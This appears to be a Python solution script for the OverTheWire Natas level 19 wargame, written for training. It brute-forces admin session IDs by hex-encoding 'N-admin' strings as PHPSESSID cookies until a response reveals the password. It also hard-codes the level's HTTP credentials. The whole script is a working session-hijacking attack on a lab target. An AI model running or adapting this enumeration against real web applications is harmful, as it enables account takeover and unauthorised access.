#!/bin/python
import requests,string,binascii

username = "natas19"
pwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = f"http://{username}.natas.labs.overthewire.org/"
data={'username':'admin','password':''}
session = requests.Session()
for i in range(0,641):
	sid=(str(i)+'-admin').encode('utf-8')
	sid=sid.hex()
	cookie = {'PHPSESSID':sid}
	response= session.get(url,auth=(username,pwd),cookies=cookie)
	if i % 10==0:
		print('Scanned ',i,' targets.')
	if 'Password' in response.text:
		print(f'GOT IT !! SESSID : {i}')
		print(response.text)
		break